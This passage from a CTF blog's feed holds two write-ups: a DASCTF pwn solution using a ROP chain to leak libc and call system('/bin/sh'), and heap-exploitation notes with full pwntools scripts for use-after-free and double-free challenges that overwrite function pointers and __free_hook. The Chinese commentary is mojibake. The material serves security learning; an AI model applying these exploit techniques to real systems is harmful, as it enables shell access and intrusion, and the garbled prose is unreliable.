    <link href="http://chumen77.xyz/2020/04/25/DASCTF%E5%AE%89%E6%81%92%E6%9C%88%E8%B5%9B/"/>
    <id>http://chumen77.xyz/2020/04/25/DASCTFå®‰æ’æœˆèµ›/</id>
    <published>2020-04-25T13:48:11.966Z</published>
    <updated>2020-10-20T02:06:34.671Z</updated>
    
    <content type="html"><![CDATA[<h1 id="DASCTFå®‰æ’æœˆèµ›-pwn"><a href="#DASCTFå®‰æ’æœˆèµ›-pwn" class="headerlink" title="DASCTFå®‰æ’æœˆèµ›-pwn"></a>DASCTFå®‰æ’æœˆèµ›-pwn</h1><h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>å¼€èµ›äº†ï¼Œæœ‰ç‚¹äº‹æƒ…æ²¡æ‰“ï¼Œæ™šä¸Šå¤ç°äº†ä¸€ä¸‹ã€‚</p><h2 id="echo-server"><a href="#echo-server" class="headerlink" title="echo-server"></a>echo-server</h2><pre><code class="python">[*] &#39;/ctf/work/ahys/echo server/test&#39;    Arch:     amd64-64-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE (0x400000)</code></pre><p>ç¨‹åºå¾ˆç®€å•ï¼Œç»å…¸æ ˆæº¢å‡ºï¼Œropåˆ©ç”¨å³å¯ã€‚<br>ä½†æ˜¯å› ä¸ºæ˜¯64ä½çš„ï¼Œå¹¶ä¸”æ˜¯glibc2.27ï¼Œå‘ç°åœ¨åšçš„æ—¶å€™æ„é€ ropé“¾æ€»æ˜¯ä¼šcurshï¼Œ<br>è°ƒè¯•å‘ç°ï¼š<br><img src="http://qiqianyun.chumen77.xyz/uPic/jfAEUD.png" srcset="/img/loading.gif" alt><br>å‘ç°è¿™æ®µæ±‡ç¼–ç›´æ¥ä¼šè®©ç¨‹åºcurshï¼Œæƒ³èµ·æ¥exå¸ˆå‚…ä¸€ç¯‡æ–‡ç« åˆ†æè¿‡ï¼Œ64ä½ç¨‹åºropåˆ°systemæ‹¿shellçš„æ—¶å€™ä¹Ÿä¼šè¿™æ ·ã€‚ä½†æ˜¯å¾ˆå¥‡æ€ªè¿™ä¸ªä¹Ÿå‡ºç°äº†ï¼Œç´¢æ€§å°è¯•ä¸€æ³¢ã€‚<br>è§£å†³åŠæ³•ï¼šè¿˜æ˜¯åŠ ä¸ªretï¼Œè®©æ ˆå¯¹å…¶å³å¯ã€‚</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *local_file  = &#39;./test&#39;local_libc  = &#39;/lib/x86_64-linux-gnu/libc-2.27.so&#39;remote_libc = &#39;./libc.so.6&#39;debug = 1if debug:    io = process(local_file)    libc = ELF(local_libc)else:    # io = remote(&#39;node3.buuoj.cn&#39;,25390)    libc = ELF(remote_libc)elf = ELF(local_file)libc = elf.libccontext.log_level = &#39;debug&#39;context.arch = elf.archcontext.terminal = [&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;]#,&#39;neww&#39;s      = lambda data               :io.send(data) sa      = lambda delim,data         :io.sendafter(delim, data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(delim, data)sea     = lambda delim,data         :io.sendafter(delim, data)r      = lambda numb=4096          :io.recv(numb)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)uu32    = lambda data               :u32(data.ljust(4, &#39;\0&#39;))uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))info_addr = lambda tag, addr        :io.info(tag + &#39;: {:#x}&#39;.format(addr))itr     = lambda                    :io.interactive()def dbg():    # gdb.attach(proc.pidof(io)[0],gdbscript=&quot;b main&quot;)    gdb.attach(io)    pause()pop_rdi = 0x0000000000400823# : pop rdi ; retoffset = 136start = 0x4005C0ret = 0x0400768sla(&#39;how long is your name:&#39;,&#39;500&#39;)payload = &#39;\x00&#39; * offset + flat([ret,pop_rdi,elf.got[&#39;read&#39;],elf.plt[&#39;printf&#39;],start])# dbg()sla(&#39;s you name?&#39;,payload)ru(&#39;hello &#39;)read = uu64(r(6))info_addr(&#39;printf&#39;,read)libc_base = read - libc.symbols[&#39;read&#39;]info_addr(&#39;libc_base&#39;,libc_base)binsh = libc_base  + libc.search(&quot;/bin/sh&quot;).next()system = libc_base + libc.sym[&#39;system&#39;]sla(&#39;how long is your name: &#39;,&#39;500&#39;)payload = &#39;\x00&#39; * offset + flat([ret,pop_rdi,binsh,system])# rec = 0x4f322 + libc_base# dbg()sla(&#39;s you name?&#39;,payload)itr()</code></pre><h2 id="å…¥é—¨reverse"><a href="#å…¥é—¨reverse" class="headerlink" title="å…¥é—¨reverse"></a>å…¥é—¨reverse</h2><pre><code class="python">s = &#39;akhb~chdaZrdaZudqduvdZvvv|&#39;flag = &#39;&#39;for i in range(26):    flag += chr((ord(s[i]) - 1) ^ 6)print(flag)</code></pre><h2 id="Encrypts"><a href="#Encrypts" class="headerlink" title="Encrypts"></a>Encrypts</h2><p>ç›´æ¥çˆ†ç ´äº†ã€‚</p><pre><code class="python">s = [38,44,33,39,59,35,34,115,117,114,113,33,36,117,118,119,35,120,38,114,117,113,38,34,113,114,117,114,36,112,115,118,121,112,35,37,121,61]for i in range(128):    flag = &#39;&#39;    for j in range(38):        flag += chr(s[j] ^ i)    if flag[:4] == &#39;flag&#39;:        print(flag)</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;DASCTFå®‰æ’æœˆèµ›-pwn&quot;&gt;&lt;a href=&quot;#DASCTFå®‰æ’æœˆèµ›-pwn&quot; class=&quot;headerlink&quot; title=&quot;DASCTFå®‰æ’æœˆèµ›-pwn&quot;&gt;&lt;/a&gt;DASCTFå®‰æ’æœˆèµ›-pwn&lt;/h1&gt;&lt;h2 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot;
      
    
    </summary>
    
    
      <category term="re" scheme="http://chumen77.xyz/tags/re/"/>
    
      <category term="pwn" scheme="http://chumen77.xyz/tags/pwn/"/>
    
      <category term="rop" scheme="http://chumen77.xyz/tags/rop/"/>
    
      <category term="uaf" scheme="http://chumen77.xyz/tags/uaf/"/>
    
  </entry>
  
  <entry>
    <title>uafå’Œdouble free</title>
    <link href="http://chumen77.xyz/2020/04/25/uaf%E5%92%8Cdouble%20free/"/>
    <id>http://chumen77.xyz/2020/04/25/uafå’Œdouble free/</id>
    <published>2020-04-25T03:40:09.709Z</published>
    <updated>2020-06-27T16:24:30.624Z</updated>
    
    <content type="html"><![CDATA[<h1 id="uafå’Œdouble-free"><a href="#uafå’Œdouble-free" class="headerlink" title="uafå’Œdouble free"></a>uafå’Œdouble free</h1><h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>æœ€è¿‘å¼€å§‹æ‰“ç®—å…¥é—¨å †ï¼Œç®€å•è®°å½•å‡ é“ç›¸å…³çš„é¢˜ã€‚</p><h2 id="hitcontraining-uaf"><a href="#hitcontraining-uaf" class="headerlink" title="hitcontraining-uaf"></a>hitcontraining-uaf</h2><p>é¢˜ç›®è¾ƒä¸ºç®€å•å­˜åœ¨åé—¨å‡½æ•°ï¼Œåˆ©ç”¨uafæ¼æ´æ”»å‡»å³å¯ã€‚</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *local_file  = &#39;./hacknote&#39;local_libc  = &#39;/lib/x86_64-linux-gnu/libc.so.6&#39;remote_libc = local_libc # &#39;../libc.so.6&#39;debug = 0if debug:    io = process(local_file)    libc = ELF(local_libc)else:    io = remote(&#39;node3.buuoj.cn&#39;,27892)    libc = ELF(remote_libc)elf = ELF(local_file)libc = elf.libccontext.log_level = &#39;debug&#39;context.arch = elf.archcontext.terminal = [&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;]#,&#39;neww&#39;s      = lambda data               :io.send(data) sa      = lambda delim,data         :io.sendafter(delim, data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(delim, data)sea     = lambda delim,data         :io.sendafter(delim, data)r      = lambda numb=4096          :io.recv(numb)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)uu32    = lambda data               :u32(data.ljust(4, &#39;\0&#39;))uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))info_addr = lambda tag, addr        :io.info(tag + &#39;: {:#x}&#39;.format(addr))itr     = lambda                    :io.interactive()def dbg():    # gdb.attach(proc.pidof(io)[0],gdbscript=&quot;b main&quot;)    gdb.attach(io)    pause()def add(size,content):    sl(&#39;1&#39;)    ru(&#39;Note size &#39;)    sl(str(size))    ru(&#39;Content :&#39;)    sl(str(content))def dele(index):    sl(&#39;2&#39;)    sl(str(index))def show(index):    sl(&#39;3&#39;)    sl(str(index))ru(&#39;Your choice :&#39;)add(16,&#39;aaaa&#39;)ru(&#39;Your choice :&#39;)add(16,&#39;bbbb&#39;)ru(&#39;Your choice :&#39;)dele(0)ru(&#39;Your choice :&#39;)dele(1)ru(&#39;Your choice :&#39;)add(8,p32(elf.symbols[&#39;magic&#39;]))ru(&#39;Your choice :&#39;)show(0)itr()</code></pre><h2 id="ACTF-2019-babyheap"><a href="#ACTF-2019-babyheap" class="headerlink" title="ACTF_2019_babyheap"></a><code>ACTF_2019_babyheap</code></h2><p>é¢˜ç›®æœ‰systemå‡½æ•°ï¼Œå¹¶ä¸”ä¹Ÿæœ‰<code>/bin/sh\x00</code> ï¼Œå½“æ—¶åœ¨æ„é€ è¿™ä¸ª<code>/bin/sh\x00</code>çš„å­—ç¬¦ä¸²æŒ‡é’ˆçš„æ—¶å€™è´¹äº†ä¸€ç‚¹åŠ²ï¼Œç»“æœå‘ç°elfæœ‰è¿™ä¸ªå­—ç¬¦ä¸²ã€‚ç„¶åå°±å¾ˆç®€å•äº†ï¼Œæ§åˆ¶å¥½å‚æ•°å³å¯ã€‚è¿˜æ˜¯uafæ¼æ´è¿›è¡Œæ”»å‡»ã€‚</p><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *local_file  = &#39;./ACTF_2019_babyheap&#39;local_libc  = &#39;/lib/x86_64-linux-gnu/libc.so.6&#39;remote_libc = local_libc # &#39;../libc.so.6&#39;debug = 1 if debug:    io = process(local_file)    libc = ELF(local_libc)else:    io = remote(&#39;node3.buuoj.cn&#39;,27341)    libc = ELF(remote_libc)elf = ELF(local_file)libc = elf.libccontext.log_level = &#39;debug&#39;context.arch = elf.archcontext.terminal = [&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;]#,&#39;neww&#39;s      = lambda data               :io.send(data) sa      = lambda delim,data         :io.sendafter(delim, data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(delim, data)sea     = lambda delim,data         :io.sendafter(delim, data)r      = lambda numb=4096          :io.recv(numb)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)uu32    = lambda data               :u32(data.ljust(4, &#39;\0&#39;))uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))info_addr = lambda tag, addr        :io.info(tag + &#39;: {:#x}&#39;.format(addr))itr     = lambda                    :io.interactive()def dbg():    # gdb.attach(proc.pidof(io)[0],gdbscript=&quot;b main&quot;)    gdb.attach(io)    pause()def add(size,content):    sla(&#39;Your choice: &#39;,&#39;1&#39;)    sla(&#39;size: \n&#39;,str(size))    sa(&#39;content: \n&#39;,str(content)) def dele(index):    sla(&#39;: &#39;,&#39;2&#39;)    sla(&#39;index: \n&#39;,str(index))def show(index):    sla(&#39;: &#39;,&#39;3&#39;)    sla(&#39;index: \n&#39;,str(index))add(32,&#39;aaaaaaaa&#39;) #0add(32,&#39;bbbbbbbb&#39;) #1dele(0)dele(1)binsh = 0x602010add(16,flat(binsh,elf.plt[&#39;system&#39;]))# dbg()show(0)itr()</code></pre><h2 id="actf-2019-message"><a href="#actf-2019-message" class="headerlink" title="actf-2019-message"></a>actf-2019-message</h2><p>Double freeï¼Œè¿ç§»åˆ°ä¼ªé€ çš„å †å—ï¼Œæ³¨æ„æ§åˆ¶å¥½ä¼ªé€ å †å—çš„sizeè·Ÿfastbinçš„å¯¹åº”ã€‚<br>æ”¹<code>__free_hook</code>ä¸ºsystemå³å¯ã€‚<code>__free_hook</code>çš„å‚æ•°æ­£å¥½æ˜¯å †å—çš„dateï¼Œè¾ƒå¥½æ§åˆ¶ã€‚<br>ï¼ˆbuuç»™çš„å¤ç°ç¯å¢ƒæ˜¯18çš„ï¼Œæœ‰äº†tcacheæœºåˆ¶ï¼Œä½†æ˜¯æœ¬äººè¿˜ä¸å¤ªç†Ÿæ‚‰ï¼Œåªæ˜¯çŸ¥é“ä¸æ£€æŸ¥sizeæ˜¯å¦å¯¹åº”äº†ï¼Œåœ¨16ä¸Šåšçš„ï¼Œç„¶åå°±è°ƒè¯•æ”¹äº†æ”¹è„šæœ¬ï¼Œæ‰“é€šäº†buuçš„å¤ç°ç¯å¢ƒã€‚ä¸‹é¢çš„expä¹Ÿæ˜¯18çš„ã€‚ï¼‰</p><h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *local_file  = &#39;./ACTF_2019_message&#39;# local_libc  = &#39;/lib/x86_64-linux-gnu/libc-2.27.so&#39;# remote_libc = local_libc # &#39;../libc.so.6&#39;debug = 1if debug:    io = process(local_file)    # libc = ELF(local_libc)else:    io = remote(&#39;node3.buuoj.cn&#39;,25390)    # libc = ELF(remote_libc)elf = ELF(local_file)libc = elf.libccontext.log_level = &#39;debug&#39;context.arch = elf.archcontext.terminal = [&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;]#,&#39;neww&#39;s      = lambda data               :io.send(data) sa      = lambda delim,data         :io.sendafter(delim, data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(delim, data)sea     = lambda delim,data         :io.sendafter(delim, data)r      = lambda numb=4096          :io.recv(numb)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)uu32    = lambda data               :u32(data.ljust(4, &#39;\0&#39;))uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))info_addr = lambda tag, addr        :io.info(tag + &#39;: {:#x}&#39;.format(addr))itr     = lambda                    :io.interactive()def dbg():    # gdb.attach(proc.pidof(io)[0],gdbscript=&quot;b main&quot;)    gdb.attach(io)    pause()def add(length,contend) :    sla(&#39;choice: &#39;,&#39;1&#39;)    sla(&#39;length of message:\n&#39;,str(length))    sa(&#39;message:\n&#39;,str(contend))def free(index):    sla(&#39;choice: &#39;,&#39;2&#39;)    sla(&#39;to delete:\n&#39;,str(index))def edit(index,contend):    sla(&#39;choice: &#39;,&#39;3&#39;)    sla(&#39;to edit:\n&#39;,str(index))    sa(&#39;the message:\n&#39;,str(contend))def show(index):    sla(&#39;choice: &#39;,&#39;4&#39;)    sla(&#39;to display:\n&#39;,str(index))add(0x30,&#39;a&#39;) #0add(0x20,&#39;a&#39;) #1add(0x20,&#39;a&#39;) #2free(1)free(2)free(1)add(0x20,p64(0x602068))add(0x20,&#39;aaaaaaaa&#39;)add(0x20,&#39;aaaaaaaa&#39;)contend = p64(elf.got[&#39;puts&#39;])# + p64(0x30) + p64(elf.got[&#39;puts&#39;])add(0x20,contend)show(0)ru(&#39; message: &#39;)puts = uu64(r(6))libc_base = puts - libc.symbols[&#39;puts&#39;]free_hook = libc_base + libc.symbols[&#39;__free_hook&#39;]print(&#39;puts&#39; + hex(puts))print(&#39;libc_base&#39; + hex(libc_base))system = libc_base + libc.symbols[&#39;system&#39;]contend = p64(free_hook)dbg()edit(6,contend)# dbg()contend = p64(system)edit(0,contend)# dbg()add(0x8,&#39;/bin/sh\x00&#39;)free(7)itr()</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;uafå’Œdouble-free&quot;&gt;&lt;a href=&quot;#uafå’Œdouble-free&quot; class=&quot;headerlink&quot; title=&quot;uafå’Œdouble free&quot;&gt;&lt;/a&gt;uafå’Œdouble free&lt;/h1&gt;&lt;h2 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;
      
    
    </summary>
    
    
      <category term="pwn" scheme="http://chumen77.xyz/tags/pwn/"/>
    
      <category term="å­¦ä¹ è®°å½•" scheme="http://chumen77.xyz/tags/%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"/>
    
  </entry>
  
</feed>
